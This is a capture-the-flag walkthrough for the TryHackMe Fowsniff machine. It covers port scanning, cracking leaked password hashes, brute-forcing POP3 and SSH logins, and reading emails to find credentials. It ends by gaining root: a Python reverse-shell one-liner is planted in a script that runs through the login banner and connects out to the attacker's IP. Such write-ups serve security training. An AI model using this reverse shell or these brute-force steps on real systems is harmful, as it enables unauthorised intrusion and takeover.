## Solution

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step.

Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine.

### Using nmap, scan this machine. What ports are open?

Hint: nmap -A -p- -sV MACHINE_IP

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ export TARGET_IP=10.10.13.185

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ sudo nmap -sV -sC -p- $TARGET_IP
[sudo] password for kali:

```

We have four main services running and available:

- OpenSSH 7.2p2 on port 22
- Apache httpd 2.4.18 on port 80
- Dovecot pop3d on port 110
- Dovecot imapd on port 143

### Using the information from the open ports. Look around. What can you find?

Hints:  
There is a pastebin with all of the company employees emails and hashes.  
If the pastebin is down, check out TheWayBackMachine, or `https://github.com/berzerk0/Fowsniff`

Manually browsing to port 80 shows a web site for the `Fowsniff Corporation`.

![Fowsniff Corp web Site](Images/Fowsniff_Corp_web_Site.png)

Further down on the web page information about a data breach can be found

```text
Fowsniff's internal system suffered a data breach that resulted in the exposure of employee usernames and passwords.

Client information was not affected.

Due to the strong possibility that employee information has been made publicly available, all employees have been 
instructed to change their passwords immediately.

The attackers were also able to hijack our official @fowsniffcorp Twitter account. All of our official tweets have 
been deleted and the attackers may release sensitive information via this medium. We are working to resolve this 
at soon as possible.

We will return to full capacity after a service upgrade.
```

### Using Google, can you find any public information about them?

Searching for information about them turn up a pwned X/Twitter-account

![Fowsniff Corp Hacked X Account](Images/Fowsniff_Corp_Hacked_X_Account.png)

The pastebin-link was removed on August 3, 2024 but a copy of the information can be found [here](https://raw.githubusercontent.com/berzerk0/Fowsniff/refs/heads/main/fowsniff.txt).

![Fowsniff Corp Pastebin](Images/Fowsniff_Corp_Pastebin.png)

### Can you decode these md5 hashes?

Hint: You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.

The leaked hashes in text format:

Using [CrackStation](https://crackstation.net/) and [Hashes.com](https://hashes.com/en/decrypt/hash) most of the hashes were cracked

### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?

Hint: In metasploit there is a packages called: `auxiliary/scanner/pop3/pop3_login` where you can enter all  
the usernames and passwords you found to brute force this machines pop3 service.

Next, we try to bruteforce POP3 with Metasploit

```bash

└─$ msfconsole -q
msf > search pop3

msf auxiliary(scanner/pop3/pop3_login) > 
```

The Metasploit module either takes a one file with passwords and one with usernames or a combined file.  
Let's go for the combined file since we know the user and password combinations.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ vi users_with_pass.txt 

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ cat users_with_pass.txt 
mauer mailcall
mustikka bilbo101
tegel apples01
baksteen skyler22
seina scoobydoo2
mursten carp4ever
parede orlando12
sciana 07011972
```

Note that the users were added without the domain (`@fowsniff`)

Back in Metasploit we set the options needed

```bash
msf auxiliary(scanner/pop3/pop3_login) > set RHOSTS 10.10.13.185
RHOSTS => 10.10.13.185
msf auxiliary(scanner/pop3/pop3_login) > set PASS_FILE ''
PASS_FILE => 
msf auxiliary(scanner/pop3/pop3_login) > set USER_FILE ''
USER_FILE => 
msf auxiliary(scanner/pop3/pop3_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(scanner/pop3/pop3_login) > set USERPASS_FILE users_with_pass.txt
USERPASS_FILE => users_with_pass.txt
msf auxiliary(scanner/pop3/pop3_login) > 
```

Note that you need to set both `USER_FILE` and `PASS_FILE` to blank values for the module to use the combined file!

And start the bruteforce attack

```bash
msf auxiliary(scanner/pop3/pop3_login) > run
[-] 10.10.13.185:110      - 10.10.13.185:110 - Failed: 'mauer:mailcall', '-ERR [AUTH] Authentication failed.'

[*] 10.10.13.185:110      - Scanned 1 of 1 hosts (100% complete)
[-] Auxiliary failed: NoMethodError undefined method `name' for an instance of String
[-] Call stack:
[-]   /usr/share/metasploit-framework/lib/msf/core/module/failure.rb:56:in `report_failure'
msf auxiliary(scanner/pop3/pop3_login) > exit
```

So we are able to login as `seina` with the password `scoobydoo2`.

### Can you connect to the pop3 service with her credentials? What email information can you gather?

Hint: Use netcat with the port 110 to view her emails.

Now we manually connedct to the POP3 service with netcat

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

### Looking through her emails, what was a temporary password set for her?

Looking through the first e-mail we find

```text
<---snip--->
The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.
<---snip--->
```

So we have a new temporary SSH-password `S1ck3nBluff+secureshell`.

And since Skyler/baksteen isn't feeling well he might not have changed the password.

### Bruteforce the SSH login

Let's just run all users with the new temporary password in `hydra` just in case

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ hydra -L users.txt -p 'S1ck3nBluff+secureshell' $TARGET_IP ssh 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-05 16:49:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

```

Yes, our assumption were correct!

### Login with SSH as baksteen

Next, we connect with SSH as baksteen

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ ssh baksteen@$TARGET_IP

```

### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?

Now we check what groups we belong to

```bash
baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
baksteen@fowsniff:~$ groups
users baksteen
baksteen@fowsniff:~$ 
```

And search for executable files that this group can run

```bash
baksteen@fowsniff:~$ find / -type f -group users -executable 2>/dev/null
/opt/cube/cube.sh
baksteen@fowsniff:~$ ls -l /opt/cube/cube.sh
-rw-rwxr-- 1 parede users 851 Mar 11  2018 /opt/cube/cube.sh
baksteen@fowsniff:~$ cat /opt/cube/cube.sh
printf "

.ohdddddddddddddho:                  Delivering Solutions\n\n"
```

### Create a reverse shell

We update the script to be a reverse shell

```bash
baksteen@fowsniff:~$ vi /opt/cube/cube.sh
baksteen@fowsniff:~$ cat /opt/cube/cube.sh
#!/bin/sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.61.233",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
baksteen@fowsniff:~$ 
```

Hint: If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!

```bash
baksteen@fowsniff:~$ ls -la /etc/update-motd.d/
total 24
drwxr-xr-x  2 root root 4096 Mar 11  2018 .

### Start a netcat listener

Now we start a netcat listener on port 1234

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ nc -lvnp 1234 
listening on [any] 1234 ...

```

### Re-login to the SSH service. You will then receive a reverse shell on your netcat session as root

And relogin to the SSH-service

```bash
baksteen@fowsniff:~$ exit
logout
Connection to 10.10.13.185 closed.

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ ssh baksteen@$TARGET_IP
baksteen@10.10.13.185's password: 

```

Checking our netcat listener we have a connection as root

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Fowsniff_CTF]
└─$ nc -lvnp 1234 
listening on [any] 1234 ...
connect to [10.14.61.233] from (UNKNOWN) [10.10.13.185] 60898
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

### Get the root flag

Finally, we get the root flag

```bash
# ls -l /root
total 8
drwx------ 5 root root 4096 Mar  9  2018 Maildir
-rw-r--r-- 1 root root  582 Mar  9  2018 flag.txt
# cat /root/flag.txt
